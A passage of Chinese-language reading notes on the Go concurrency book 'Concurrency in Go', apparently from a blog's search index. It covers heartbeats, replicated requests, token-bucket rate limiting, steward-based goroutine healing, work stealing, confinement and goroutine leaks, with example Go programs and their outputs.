any)\ttime.AfterFunc(10*time.Second, func() &#123; close(done) &#125;)\tconst timeout = 2 * time.Second\theartbeat, results := doWork(done, timeout/2)\tfor &#123;\t\tselect &#123;\t\tcase _, ok := &lt;-heartbeat:\t\t\tif !ok &#123;\t\t\t\treturn\t\t\t&#125;\t\t\tfmt.Println(&quot;pulse&quot;)\t\tcase r, ok := &lt;-results:\t\t\tif !ok &#123;\t\t\t\treturn\t\t\t&#125;\t\t\tfmt.Printf(&quot;results %v\\n&quot;, r.Second())\t\tcase &lt;-time.After(timeout):\t\t\tfmt.Println(&quot;worker goroutine is not healthy!&quot;)\t\t\treturn\t\t&#125;\t&#125;&#125;\n\n输出如下：\npulsepulseworker goroutine is not healthy!\n\n心跳和超时在正常工作，通过心跳可以确定 goroutine 是否在正常运行，从而避免死锁。\n复制请求对于某些应用来说，尽可能快地接收响应是重中之重。例如，程序正在处理用户的HTTP请求，或者检索一个数据块。在这些情况下，你可以进行权衡：你可以将请求分发到多个处理程序（无论是goroutine,进程，还是服务器），其中一个将比其他处理程序返回更快，你可以立即返回结果。缺点是为了维特多个实例的运行，你将不得不消耗更多的资源。\n如果这种复制是在内存中进行的，消耗则没有那么大，但是如果多个处理程序要多个进程，服务器甚至是数据中心，那可能会变得相当昂贵。所以你需要决定这么做是否值得。\n来看看如何在单个进程中制造复制请求。使用多个goroutine作为处理程序，并且goroutine将随机休眠一段时间以模似不同的负载，休眠时间在1到6秒之间。这将使我们处理程序在不同的时间返回结果，并且我们可以看到复制请求如何更快的返回结果。下面是一个在10个处理程序上复制模拟请求的例子：\npackage mainimport (\t&quot;fmt&quot;\t&quot;math/rand&quot;\t&quot;sync&quot;\t&quot;time&quot;)func main() &#123;\tdowork := func(done &lt;-chan any, id int, wg *sync.WaitGroup, result chan&lt;- int) &#123;\t\tstarted := time.Now()\t\tdefer wg.Done()\t\t// 模拟随机负找\t\tsimulatedLoadTime := time.Duration(1+rand.Intn(5)) * time.Second\t\tselect &#123;\t\tcase &lt;-done:\t\tcase &lt;-time.After(simulatedLoadTime):\t\t&#125;\t\tselect &#123;\t\tcase &lt;-done:\t\tcase result &lt;- id:\t\t&#125;\t\ttook := time.Since(started)\t\t// 显示处理程序需要多长时间\t\tif took &lt; simulatedLoadTime &#123;\t\t\ttook = simulatedLoadTime\t\t&#125;\t\tfmt.Printf(&quot;%v took %v\\n&quot;, id, took)\t&#125;\tdone := make(chan any)\tresult := make(chan int)\tvar wg sync.WaitGroup\twg.Add(10)\tfor i := 0; i &lt; 10; i++ &#123; // 启动 10 个处理程序\t\tgo dowork(done, i, &amp;wg, result)\t&#125;\tfirstReturned := &lt;-result // 获取处理程序组的第一个结果\tclose(done)               // 取消其余处理程序\twg.Wait()\tfmt.Printf(&quot;Received an answer from %v\\n&quot;, firstReturned)&#125;\n\n输出结果：\n6 took 1.0010419s9 took 2s0 took 3s8 took 2s7 took 2s4 took 4s3 took 4s5 took 1.0010419s1 took 2s2 took 2sReceived an answer from 6\n\n这里第六个处理程序返回的最快。注意，所有的处理程序都应该是尽可能的等价的，有相同的机会处理请求。但需要复制请求的场景很少，因为建立和维护这样的系统有非常大的代价。除非对响应速度的要求可以接受这样的代价。另外，这种方式天然地提供了容错和可扩展性。（分布式处理，不过只取第一个响应的，而取消其他。比较浪费\n速率限制限制某种资源在某段时间内被访问的次数。资源可以是任何东西：API连接、磁盘读写、网络包、异常…速率限制允许将系统的性能和隐定性平衡在可控范围内。如果需要扩大这些限制，可以在大量测试和等待后，以可控的方式进行拓展。\n大多数的限速是基于令牌桶算法的。这很容易理解，而且相对容易实现。如果要访问资源，你必须拥有资源的访问令牌，没有令牌的请求会被拒绝。现在假设这些令牌存储在一个等待被检索使用的桶中。桶的深度为d,表示一个桶可以容纳d个访问令牌。例如，存储桶深度为五，则可以存放五个令牌。每当你需要访问资源时，都会在桶中删除一个令牌。如果你的存储桶包含五个令牌，前五次访问没有问题，操作正常进行；但是在第六次尝试时，就没有访问令牌可用。你的请求必须排队等待，直到令牌可用，或者被拒绝操作。\n那如何补充令牌，我们总是能获得一个新的吗？在令牌桶算法中，将r定义为向桶中添加令牌的速率。它可以是一纳秒或一分钟。这就是我们通常认为的速率限制：因为我们必须等到新的令牌可用，我们将操作速度限制在这个频率下。\n现在我们有两个设置项可以修改：有多少个令牌可以立即使用d,桶的深度，以及它们补充的速度r。在这两者之间，我们可以平衡突发性和限制整体速率。突发性指的是当存储桶已满时可以进行多少次请求。\n下面是使用golang.org/x/time/rate包实现的例子，同时对磁盘访问和网络访问添加限制。\npackage mainimport (\t&quot;context&quot;\t&quot;golang.org/x/time/rate&quot;\t&quot;log&quot;\t&quot;os&quot;\t&quot;sort&quot;\t&quot;sync&quot;\t&quot;time&quot;)func main() &#123;\tdefer log.Printf(&quot;Done.&quot;)\tlog.SetOutput(os.Stdout)\tlog.SetFlags(log.Ltime | log.LUTC)\tapiConnection := Open()\tvar wg sync.WaitGroup\twg.Add(20)\tfor i := 0; i &lt; 10; i++ &#123;\t\tgo func() &#123;\t\t\tdefer wg.Done()\t\t\terr := apiConnection.ReadFile(context.Background())\t\t\tif err != nil &#123;\t\t\t\tlog.Printf(&quot;cannot ReadFile: %v&quot;, err)\t\t\t&#125;\t\t\tlog.Printf(&quot;ReadFile&quot;)\t\t&#125;()\t&#125;\tfor i := 0; i &lt; 10; i++ &#123;\t\tgo func() &#123;\t\t\tdefer wg.Done()\t\t\terr := apiConnection.ResolveAddress(context.Background())\t\t\tif err != nil &#123;\t\t\t\tlog.Printf(&quot;cannot ResolveAddress: %v&quot;, err)\t\t\t&#125;\t\t\tlog.Printf(&quot;ResolveAddress&quot;)\t\t&#125;()\t&#125;\twg.Wait()&#125;func Per(eventCount int, duration time.Duration) rate.Limit &#123;\treturn rate.Every(duration / time.Duration(eventCount))&#125;func Open() *APIConnection &#123;\treturn &amp;APIConnection&#123;\t\tapiLimiter: MultiLimiter( // 为API调用设置限速器，每秒请求数与每分钟请求数都有限制\t\t\trate.NewLimiter(Per(2, time.Second), 2), // 第一个参数为频率，第二个为桶大小\t\t\trate.NewLimiter(Per(10, time.Minute), 10),\t\t),\t\tdiskLimiter: MultiLimiter( // 为磁盘操作设置限速器，每秒一次\t\t\trate.NewLimiter(rate.Limit(1), 1),\t\t),\t\tnetworkLimiter: MultiLimiter( // 为网络操作设置限速器，每秒3次\t\t\trate.NewLimiter(Per(3, time.Second), 3),\t\t),\t&#125;&#125;type APIConnection struct &#123;\tnetworkLimiter RateLimiter\tdiskLimiter    RateLimiter\tapiLimiter     RateLimiter&#125;func (a *APIConnection) ReadFile(ctx context.Context) error &#123;\t// 读取文件时，同时使用API限速器和磁盘限速器的限制\tif err := MultiLimiter(a.apiLimiter, a.diskLimiter).Wait(ctx); err != nil &#123;\t\treturn err\t&#125;\t// 假设执行一些逻辑\treturn nil&#125;func (a *APIConnection) ResolveAddress(ctx context.Context) error &#123;\t// 网络访问时，同时使用API限速器和网络限速器的限制\tif err := MultiLimiter(a.apiLimiter, a.networkLimiter).Wait(ctx); err != nil &#123;\t\treturn err\t&#125;\t// 假设执行一些逻辑\treturn nil&#125;type RateLimiter interface &#123; // 定义 RateLimiter 接口，使 MultiLimiter 可以递归地定义其他 MultiLimiter 实例。\tWait(context.Context) error\tLimit() rate.Limit&#125;func MultiLimiter(limiters ...RateLimiter) *multiLimiter &#123;\tbyLimit := func(i, j int) bool &#123;\t\treturn limiters[i].Limit() &lt; limiters[j].Limit()\t&#125;\tsort.Slice(limiters, byLimit) // 根据每个 RateLimiter 的 Limit() 进行排序\treturn &amp;multiLimiter&#123;limiters: limiters&#125;&#125;type multiLimiter struct &#123;\tlimiters []RateLimiter&#125;func (l *multiLimiter) Wait(ctx context.Context) error &#123;\tfor _, l := range l.limiters &#123;\t\tif err := l.Wait(ctx); err != nil &#123;\t\t\treturn err\t\t&#125;\t&#125;\treturn nil&#125;func (l *multiLimiter) Limit() rate.Limit &#123;\treturn l.limiters[0].Limit() // 返回限制最多的限速器（已排序&#125;\n\n输出如下：\n09:09:32 ReadFile09:09:33 ReadFile09:09:33 ResolveAddress09:09:34 ReadFile09:09:35 ReadFile09:09:36 ReadFile09:09:36 ResolveAddress09:09:37 ReadFile09:09:38 ResolveAddress09:09:38 ReadFile09:09:39 ReadFile09:09:44 ResolveAddress09:09:50 ReadFile09:09:56 ResolveAddress09:10:02 ResolveAddress09:10:08 ResolveAddress09:10:14 ResolveAddress09:10:20 ResolveAddress09:10:26 ResolveAddress09:10:32 ReadFile09:10:32 Done.\n\n治愈异常的goroutine在长期运行的后台程序中，经常会有一些长时间运行的goroutine。这些goroutine经常处于阻塞状态，等待数据以某种方式到达，然后唤醒它们，进行一些处理，再返回一些数据。有时候，这些goroutine依赖于一些控制不太好的资源。也许一个goroutine需要从接收到的请求中提取数据，或者它正在监听一个临时文件。问题在于，如果没有外部干预，一个goroutine很容易进入一个不正常的状态，并且无法恢复。抛开这些担忧，你甚至可以说，goroutine本身不应该关心其如何从一个异常状态回复过来。在一个长期运行的程序中，建立一个机制来监控你的goroutine是否处于健康的状态是很用的，当他们变得异常时，就可以尽快重启。我们将这个重启goroutine的过程称为“治愈”(Healing）。\n为了治愈goroutine,我们需要使用心跳模式来检查我们正在监控的goroutine是否活跃。心跳的类型取决于你想要监控的内容，但是如果你的goroutine有可能会产生活锁，确保心跳包含某些信息，表明该goroutine在正常的工作而不仅仅是活着。把监控goroutine的健康这段逻辑称为管理员，它监视一个管理区的goroutine。如果有goroutine变得不健康，管理员将负责重新启动这个管理区的goroutine。\npackage mainimport (\t&quot;log&quot;\t&quot;os&quot;\t&quot;time&quot;)func main() &#123;\tvar or func(channels ...&lt;-chan any) &lt;-chan any\tor = func(channels ...&lt;-chan any) &lt;-chan any &#123;\t\tswitch len(channels) &#123;\t\tcase 0:\t\t\treturn nil\t\tcase 1:\t\t\treturn channels[0]\t\t&#125;\t\torDone := make(chan any)\t\tgo func() &#123;\t\t\tdefer close(orDone)\t\t\tswitch len(channels) &#123;\t\t\tcase 2:\t\t\t\tselect &#123;\t\t\t\tcase &lt;-channels[0]:\t\t\t\tcase &lt;-channels[1]:\t\t\t\t&#125;\t\t\tdefault:\t\t\t\tselect &#123;\t\t\t\tcase &lt;-channels[0]:\t\t\t\tcase &lt;-channels[1]:\t\t\t\tcase &lt;-channels[2]:\t\t\t\tcase &lt;-or(append(channels[3:], orDone)...):\t\t\t\t&#125;\t\t\t&#125;\t\t&#125;()\t\treturn orDone\t&#125;\ttype startGoroutineFn func(done &lt;-chan any, pulseInterval time.Duration) (heartbeat &lt;-chan any) // 定义一个可以监控和重启的goroutine的信号\tnewSteward := func(timeout time.Duration, startGoroutine startGoroutineFn) startGoroutineFn &#123; // 管理员监控goroutine需要timeout变量和启动goroutine的startGoroutine函数，同时，返回一个startGoroutineFn，说明管理员本身也是可以监控的\t\treturn func(done &lt;-chan any, pulseInterval time.Duration) &lt;-chan any &#123;\t\t\theartbeat := make(chan any)\t\t\tgo func() &#123;\t\t\t\tdefer close(heartbeat)\t\t\t\tvar wardDone chan any\t\t\t\tvar wardHeartbeat &lt;-chan any\t\t\t\tstartWard := func() &#123; // 定义一个闭包，实现一个统一的方法来启动正在监控的goroutine\t\t\t\t\twardDone = make(chan any)                                     // 停止信号，用来停止正在监控的goroutine\t\t\t\t\twardHeartbeat = startGoroutine(or(wardDone, done), timeout/2) // 启动将要监控的goroutine\t\t\t\t&#125;\t\t\t\tstartWard()\t\t\t\tpulse := time.Tick(pulseInterval)\t\t\t\tfor &#123;\t\t\t\t\ttimeoutSignal := time.After(timeout)\t\t\t\t\t// 管理员自身心跳\t\t\t\t\tselect &#123;\t\t\t\t\tcase &lt;-pulse:\t\t\t\t\t\tselect &#123;\t\t\t\t\t\tcase heartbeat &lt;- struct&#123;&#125;&#123;&#125;:\t\t\t\t\t\tdefault:\t\t\t\t\t\t&#125;\t\t\t\t\tdefault:\t\t\t\t\t&#125;\t\t\t\t\t// 监控goroutine\t\t\t\t\tselect &#123;\t\t\t\t\tcase &lt;-wardHeartbeat: // 如果收到心跳，将继续监控\t\t\t\t\t\tbreak\t\t\t\t\tcase &lt;-timeoutSignal: // 在暂停期间没有收到goroutine心跳，会进行重启\t\t\t\t\t\tlog.Println(&quot;steward: ward unhealthy; restarting&quot;)\t\t\t\t\t\tclose(wardDone)\t\t\t\t\t\tstartWard()\t\t\t\t\t\tbreak\t\t\t\t\tcase &lt;-done:\t\t\t\t\t\treturn\t\t\t\t\t&#125;\t\t\t\t&#125;\t\t\t&#125;()\t\t\treturn heartbeat\t\t&#125;\t&#125;\tlog.SetOutput(os.Stdout)\tlog.SetFlags(log.Ltime | log.LUTC)\tdoWork := func(done &lt;-chan any, _ time.Duration) &lt;-chan any &#123;\t\tlog.Println(&quot;ward: Hello, I&#x27;m irresponsible!&quot;)\t\tgo func() &#123;\t\t\t&lt;-done // 这个goroutine没有做任何事，只是等待被取消\t\t\tlog.Println(&quot;ward: I am halting.&quot;)\t\t&#125;()\t\treturn nil\t&#125;\tdoWorkWithSteward := newSteward(4*time.Second, doWork) // 为上面的goroutine创建一个管理员，设置超时时间为4秒\tdone := make(chan any)\ttime.AfterFunc(9*time.Second, func() &#123; // 设置9秒后停止管理员和goroutine\t\tlog.Println(&quot;main: halting steward and ward.&quot;)\t\tclose(done)\t&#125;)\tfor range doWorkWithSteward(done, 4*time.Second) &#123;\t&#125; // 启动管理员，并在其心跳范围内防止测试停止\tlog.Println(&quot;Done&quot;)&#125;\n\n它可以一直监控一个goroutine，当goroutine不活跃时，管理员会重新启动它。输出如下：\n03:28:14 ward: Hello, I&#x27;m irresponsible!03:28:18 steward: ward unhealthy; restarting03:28:18 ward: Hello, I&#x27;m irresponsible!03:28:18 ward: I am halting.03:28:22 steward: ward unhealthy; restarting03:28:22 ward: Hello, I&#x27;m irresponsible!03:28:22 ward: I am halting.03:28:23 main: halting steward and ward.03:28:23 ward: I am halting.03:28:26 Done\n\n上面的输出看起来符合预期，在其超时时重启它。但是它所管理goroutine有些简单，除了取消和心跳所需要的东西之外，不接受任何参数，也不返回任何参数。下面的例子根据离散值生成一个整数流，并在遇到负数时结束，使用闭包来对其进行包装，可以添加一些参数和返回值。\npackage mainimport (\t&quot;fmt&quot;\t&quot;log&quot;\t&quot;os&quot;\t&quot;time&quot;)func main() &#123;\tvar or func(channels ...&lt;-chan any) &lt;-chan any\tor = func(channels ...&lt;-chan any) &lt;-chan any &#123;\t\tswitch len(channels) &#123;\t\tcase 0:\t\t\treturn nil\t\tcase 1:\t\t\treturn channels[0]\t\t&#125;\t\torDone := make(chan any)\t\tgo func() &#123;\t\t\tdefer close(orDone)\t\t\tswitch len(channels) &#123;\t\t\tcase 2:\t\t\t\tselect &#123;\t\t\t\tcase &lt;-channels[0]:\t\t\t\tcase &lt;-channels[1]:\t\t\t\t&#125;\t\t\tdefault:\t\t\t\tselect &#123;\t\t\t\tcase &lt;-channels[0]:\t\t\t\tcase &lt;-channels[1]:\t\t\t\tcase &lt;-channels[2]:\t\t\t\tcase &lt;-or(append(channels[3:], orDone)...):\t\t\t\t&#125;\t\t\t&#125;\t\t&#125;()\t\treturn orDone\t&#125;\ttype startGoroutineFn func(done &lt;-chan any, pulseInterval time.Duration) (heartbeat &lt;-chan any)\tnewSteward := func(timeout time.Duration, startGoroutine startGoroutineFn) startGoroutineFn &#123;\t\treturn func(done &lt;-chan any, pulseInterval time.Duration) &lt;-chan any &#123;\t\t\theartbeat := make(chan any)\t\t\tgo func() &#123;\t\t\t\tdefer close(heartbeat)\t\t\t\tvar wardDone chan any\t\t\t\tvar wardHeartbeat &lt;-chan any\t\t\t\tstartWard := func() &#123;\t\t\t\t\twardDone = make(chan any)\t\t\t\t\twardHeartbeat = startGoroutine(or(wardDone, done), timeout/2)\t\t\t\t&#125;\t\t\t\tstartWard()\t\t\t\tpulse := time.Tick(pulseInterval)\t\t\t\tfor &#123;\t\t\t\t\ttimeoutSignal := time.After(timeout)\t\t\t\t\tselect &#123;\t\t\t\t\tcase &lt;-pulse:\t\t\t\t\t\tselect &#123;\t\t\t\t\t\tcase heartbeat &lt;- struct&#123;&#125;&#123;&#125;:\t\t\t\t\t\tdefault:\t\t\t\t\t\t&#125;\t\t\t\t\tdefault:\t\t\t\t\t&#125;\t\t\t\t\tselect &#123;\t\t\t\t\tcase &lt;-wardHeartbeat:\t\t\t\t\t\tbreak\t\t\t\t\tcase &lt;-timeoutSignal:\t\t\t\t\t\tlog.Println(&quot;steward: ward unhealthy; restarting&quot;)\t\t\t\t\t\tclose(wardDone)\t\t\t\t\t\tstartWard()\t\t\t\t\t\tbreak\t\t\t\t\tcase &lt;-done:\t\t\t\t\t\treturn\t\t\t\t\t&#125;\t\t\t\t&#125;\t\t\t&#125;()\t\t\treturn heartbeat\t\t&#125;\t&#125;\ttake := func(done &lt;-chan any, valueStream &lt;-chan any, num int) &lt;-chan any &#123;\t\ttakeStream := make(chan any)\t\tgo func() &#123;\t\t\tdefer close(takeStream)\t\t\tfor i := 0; i &lt; num; i++ &#123;\t\t\t\tselect &#123;\t\t\t\tcase &lt;-done:\t\t\t\t\treturn\t\t\t\tcase takeStream &lt;- &lt;-valueStream:\t\t\t\t&#125;\t\t\t&#125;\t\t&#125;()\t\treturn takeStream\t&#125;\torDone := func(done, c &lt;-chan any) &lt;-chan any &#123;\t\tvalStream := make(chan any)\t\tgo func() &#123;\t\t\tdefer close(valStream)\t\t\tfor &#123;\t\t\t\tselect &#123;\t\t\t\tcase &lt;-done:\t\t\t\t\treturn\t\t\t\tcase v, ok := &lt;-c:\t\t\t\t\tif ok == false &#123;\t\t\t\t\t\treturn\t\t\t\t\t&#125;\t\t\t\t\tselect &#123;\t\t\t\t\tcase valStream &lt;- v:\t\t\t\t\tcase &lt;-done:\t\t\t\t\t&#125;\t\t\t\t&#125;\t\t\t&#125;\t\t&#125;()\t\treturn valStream\t&#125;\tbridge := func(done &lt;-chan any, chanStream &lt;-chan &lt;-chan any) &lt;-chan any &#123;\t\tvalStream := make(chan any)\t\tgo func() &#123;\t\t\tdefer close(valStream)\t\t\tfor &#123;\t\t\t\tvar stream &lt;-chan any\t\t\t\tselect &#123;\t\t\t\tcase maybeStream, ok := &lt;-chanStream:\t\t\t\t\tif ok == false &#123;\t\t\t\t\t\treturn\t\t\t\t\t&#125;\t\t\t\t\tstream = maybeStream\t\t\t\tcase &lt;-done:\t\t\t\t\treturn\t\t\t\t&#125;\t\t\t\tfor val := range orDone(done, stream) &#123;\t\t\t\t\tselect &#123;\t\t\t\t\tcase valStream &lt;- val:\t\t\t\t\tcase &lt;-done:\t\t\t\t\t&#125;\t\t\t\t&#125;\t\t\t&#125;\t\t&#125;()\t\treturn valStream\t&#125;\tdoWorkFn := func(done &lt;-chan any, intList ...int) (startGoroutineFn, &lt;-chan any) &#123; // 添加所需的参数和返回值\t\tintChanStream := make(chan (&lt;-chan any)) // 创建作为桥接模式一部分的 channel\t\tintStream := bridge(done, intChanStream)\t\tdoWork := func(done &lt;-chan any, pulseInterval time.Duration) &lt;-chan any &#123; // 创建一个被监控的闭包\t\t\tintStream := make(chan any) // 实例化 channel，与 goroutine 通信\t\t\theartbeat := make(chan any)\t\t\tgo func() &#123;\t\t\t\tdefer close(intStream)\t\t\t\tselect &#123;\t\t\t\tcase intChanStream &lt;- intStream: // 将用来通信的 channel 传递给 bridge\t\t\t\tcase &lt;-done:\t\t\t\t\treturn\t\t\t\t&#125;\t\t\t\tfor &#123;\t\t\t\t\tfor _, intVal := range intList &#123;\t\t\t\t\t\tif intVal &lt; 0 &#123;\t\t\t\t\t\t\tlog.Printf(&quot;negative value: %v\\n&quot;, intVal) // 遇到负数时给出错误信息并从 goroutine 返回\t\t\t\t\t\t\treturn\t\t\t\t\t\t&#125;\t\t\t\t\t\tpulse := time.Tick(pulseInterval)\t\t\t\t\t\tselect &#123;\t\t\t\t\t\tcase &lt;-pulse:\t\t\t\t\t\t\tselect &#123;\t\t\t\t\t\t\tcase heartbeat &lt;- struct&#123;&#125;&#123;&#125;:\t\t\t\t\t\t\tdefault:\t\t\t\t\t\t\t&#125;\t\t\t\t\t\tdefault:\t\t\t\t\t\t&#125;\t\t\t\t\t\tselect &#123;\t\t\t\t\t\tcase intStream &lt;- intVal:\t\t\t\t\t\t\tbreak\t\t\t\t\t\tcase &lt;-done:\t\t\t\t\t\t\treturn\t\t\t\t\t\t&#125;\t\t\t\t\t&#125;\t\t\t\t&#125;\t\t\t&#125;()\t\t\treturn heartbeat\t\t&#125;\t\treturn doWork, intStream\t&#125;\tlog.SetFlags(log.Ltime | log.LUTC)\tlog.SetOutput(os.Stdout)\tdone := make(chan any)\tdefer close(done)\tdoWork, intStream := doWorkFn(done, 1, 2, -1, 3, 4, 5)\tdoWorkWithSteward := newSteward(1*time.Millisecond, doWork)\tdoWorkWithSteward(done, 1*time.Hour)\tfor intVal := range take(done, intStream, 6) &#123;\t\tfmt.Printf(&quot;Received: %v\\n&quot;, intVal)\t&#125;&#125;\n\n输出如下：\nReceived: 107:22:25 negative value: -1Received: 207:22:25 steward: ward unhealthy; restartingReceived: 107:22:25 negative value: -1Received: 207:22:25 steward: ward unhealthy; restartingReceived: 107:22:25 negative value: -1Received: 2\n\n第六章 - goroutine 和 Go语言运行时工作窃取Go语言将调度多个goroutine,使其在系统线程上运行。它使用的算法被称为工作窃取策略。\n\n朴素策略（公平调度策略）在所有可用处理器之间平均分配任务。但是在fork-join模型中，任务可能会相互依赖，导致处理器空闲等待。另外还可能导致缓存的位置偏差，因为调用这些数据的任务跑在其他处理器上。\n工作窃取算法：集中队列算法使用一个集中化的FIFO队列来存储待处理的任务。处理器从队列中获取任务进行执行。但是反复进出临界区会导致较高的竞争开销。也有缓存偏移的问题，集中式队列需要频繁地加载到每个处理器的缓存中，影响缓存效率。\n工作窃取算法：分布式队列算法每个处理器拥有独立的双端队列。解决了集中式队列的竞争问题，提高了并行度和缓存命中率。每个处理器有自己的队列，减少了竞争开销。任务在同一处理器上执行，提高了缓存命中率。\n\n在goroutine开始的时候fork,join点是两个或更多的goroutine通过channel或sync包中的类型进行同步时。工作窃取算法遵循一些基本原则。对于给定的线程：\n\n在fork点，将任务添加到与线程关联的双端队列的尾部。\n如果线程空闲，则选取一个随机的线程，从它关联的双端队列头部窃取工作。\n如果在未准备好的join点（即与其同步的goroutine还没有完成），则将工作从线程的双端队列尾部出栈。\n如果线程的双端队列是空的，则：\n暂停加入。\n从随机线程关联的双端队列中窃取工作。\n\n\n\n正在执行的线程会在队列的尾部人栈或者（必要时）出栈一个任务。位于队列尾部的任务有这样几个有趣的特性：\n\n这是最有可能完成父进程join的任务。更快地完成join意味着我们的程序性能会更好，在内存中停留的时间更少。\n这是最有可能存在于处理器缓存中的任务。因为这是这个线程在开始当前工作前的最后一个任务。所以当前线程执行需要的信总可能仍然存在于CPU的缓存之中。这意味着缓存的命中率更高\n\n窃取任务还是续体什么样的任务进行排队和窃取。fork-join模式下两种选择：新任务和续体。\n窃取任务是指一个空闲的处理器从另一个忙碌的处理器的任务队列中获取任务进行执行。窃取续体是指一个处理器从另一个处理器的任务队列中获取未完成的goroutine（或称为续体）并继续执行。\nG0语言的周度器有三个主要的概念：\n\nG goroutine.\nM OS线程（在源代码中也被称为机器）。 \nP 上下文（在源代码中也被称为处理器）。\n\nGo语言的工作窃取算法对续体进行入队和窃取。当一个执行线程到达一个join point时，该线程必须暂停执行，等待回调以窃取任务。\n向开发人员展示所有这些信息关键字 go 连接所有的这些\n在函数或闭包之前敲上go,就会有一个会自动调度的任务，它将以最有效率的方式利用它所在的机器。作为开发者，我们依旧使用我们最熟悉的原语：function。我们不必理解新的处理方式，复杂的数据结构或调度算法。\nEnd很好的书，有些从未见过的go代码。对于熟悉go并发的使用非常好。最后一章关于go原理部分有些抽象，后续可能会单独写一篇关于go线程模型的文章以深入了解下。\n现在，该去重构我的聊天室应用了。\n","categories":["读书笔记"],"tags":["go","并发","《go语言并发之道》"]},{"title":"《go语言并发之道》读书笔记-并发模式","url":"/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E3%80%8Ago%E8%AF%AD%E8%A8%80%E5%B9%B6%E5%8F%91%E4%B9%8B%E9%81%93%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-%E5%B9%B6%E5%8F%91%E6%A8%A1%E5%BC%8F/","content":"第四章 - Go语言的并发模式前面讲了Go语言的并发原语的基本原理，这章要讨论如何将它们组合成模式，以帮助保持系统的可拓展性和可维护性。\n约束在编写并发代码的时候，有以下几种不同的保证操作安全的方法。我们已经介绍了其中两个：\n\n用于共享内存的同步原语（如sync.Mutex)。\n通过通信共享内存来进行同步（如channel)。\n\n但是，在并发处理中还有其他几种情况也是隐式并发安全的：\n\n不会发生改变的数据。\n受到保护的数据。\n\n从某种意义上讲，不可变数据是理想的，因为它是隐式地并行安全的。每个并发进程可能对相同的数据进行操作，但不能对其进行修改。如果要创建新数据，则必须创建具有所需修改的数据的新副本。这不仅可以减轻开发人员的认知负担，并且可以使程序运行得更快，这将使程序的临界区减少（或者完全消除临界区)在G0语言中，可以通过编写利用值的副本而不是指向内存值的指针的代码来实现此目的。有些语言支持使用明确不变的值的指针，然而，G0语言不在其中。“约束”还可以使开发人员减少临界区的长度以及承担更小的认知负担。约束并发值的技术比简单传递值的副本要复杂一点，所以本章我们将深入介绍这些约束技术。\n“约束”是一种确保了信息只能从一个并发过程中获取到的简单且强大的方法。达到此目的时，并发程序隐式安全，不需要同步。有两种可能的约束：特定约束和词法约束。\n特定约束是指通过公约实现约束时，无论是由语言社区、你所在的团队，还是你的代码库设置。坚持约束很难在任何规模的项目上进行协调，除非你有工具在每次有人提交代码时对你的代码进行静态分析。（因为每个人开发习惯和理解不一致，导致基本是不可能的事）\n词法约束涉及使用词法作用域仅公开用于多个并发进程的正确数据和并发原语。这使得做错事是不可能的。实际上我们已经在第3章中谈到了这个主题。回想一下 channel 部分，它讨论的只是将 channel 的读或写处理暴露给需要它们的并发进程。因为 channel 是并发安全的。下面看一个不是并发安全的数据结构约束的例子，他是一个 bytes Buffer 的实例：\npackage mainimport (\t\"bytes\"\t\"fmt\"\t\"sync\")func main() {\tprintData := func(wg *sync.WaitGroup, data []byte) {\t\tdefer wg.Done()\t\tvar buff bytes.Buffer\t\tfor _, b := range data {\t\t\tfmt.Fprintf(&amp;buff, \"%c\", b)\t\t}\t\tfmt.Println(buff.String())\t}\tvar wg sync.WaitGroup\twg.Add(2)\tdata := []byte(\"golang\")\tgo printData(&amp;wg, data[:3])\tgo printData(&amp;wg, data[3:])\twg.Wait()}\n\n在这个例子中，你可以看到，因为 printData 没有对切片数据进行封装或保护。但因为传递的是切片的不同子集，且不重合。 所以可以通过不用通过通信完成内存访问同步或共享数据。\n那么有什么意义呢？如果我们有同步功能，为什么要约束？答案是提高了性能并降低了开发人员的认知负担。同步带来了成本，如果你可以避免它，你将不会有任何临界区，因此你不必为同步它们付出任何成本。你也可以通过同步回避所有可能的问题，开发人员根本不必担心这些问题。利用词法约束的并发代码通常比不具有词法约束变量的并发代码更易于理解。这是因为在你的词法范围内，你可以编写同步代码。但建立约束可能很困难。\nfor-select 循环向 channel 发送迭代变量通常情况下，你需要将可迭代的内容转换为channel上的值。这不是什么幻想，通常看起来像这样：\nfor _, s := range []string{\"a\", \"b\", \"c\"} {\tselect {\tcase &lt;-done:\t\treturn\tcase stringStream &lt;- s:\t\t// ...\t}}\n\n循环等待停止创建循环，无限循环直到停止的goroutine很常见。这个有一些变化。你选择哪一个纯粹是一种个人爱好。第一种变体保持select语句尽可能短：\nfor {\tselect {\tcase &lt;-done:\t\treturn\tdefault:\t}\t// 进行非抢占式任务}\n\n如果已经完成的 channel 未关闭，我们将退出 select 语句并继续执行 for 循环的其余部分。\n第二种变体将工作嵌入到选择语句的默认子句中：\nfor {\tselect {\tcase &lt;-done:\t\treturn\tdefault:\t\t// 进行非抢占式任务\t}}\n\n当我们输入 select 语句时，如果完成的 channel 尚未关闭，我们将执行 default 子句。这种模式没有什么别的了，但它在任何地方都会被用到，所以值得一提。\n防止goroutine泄漏goroutine 是廉价且易于创建，这是让Go语言这么富有成效的原因之一。运行时将多个 goroutine 复用到任意数量的操作系统线程，以便我们不必担心该抽象级别。但是 goroutine 还是需要消耗资源，而且 goroutine 不会被运行时垃圾回收，所以无论goroutine所占用的内存有多么的少，我们都不希望我们的进程对此没有感知。那么我们如何去确保他们被清理干净？\ngoroutine有以下几种方式被终止：\n\n当它完成了它的工作。\n因为不可恢复的错误，它不能继续工作。\n当它被告知需要终止工作。\n\n我们可以很简单地使用前两种方法，因为这两种方法就隐含在你的算法中，但是“取消工作”又是怎样工作的呢？由于网络的影响，事实证明这是最重要的一点：如果你开始了一个goroutine,最有可能以某种有组织的方式与其他几个goroutine合作。我们甚至可以将这种相互连接表现为一个图表：子 goroutine 是否应该继续执行可能是以许多其他goroutine状态的认知为基础的。\ngoroutine(通常是main goroutine)具有这种完整的语境知识应该能够告诉其子goroutine终止。让我们从一个简单的goroutine泄漏开始：\npackage mainimport (\t\"fmt\")func main() {\tdoWork := func(strings &lt;-chan string) &lt;-chan any {\t\tcompleted := make(chan any)\t\tgo func() {\t\t\tdefer fmt.Println(\"dowork exited.\")\t\t\tdefer close(completed)\t\t\tfor s := range strings {\t\t\t\t// 做些有趣的操作\t\t\t\tfmt.Println(s)\t\t\t}\t\t}()\t\treturn completed\t}\tdoWork(nil)\t// 也许这里有其他的操作需要进行\tfmt.Println(\"Done.\")}\n\n在这里，我们看到 main goroutine 将一个空的 channel 传递给了 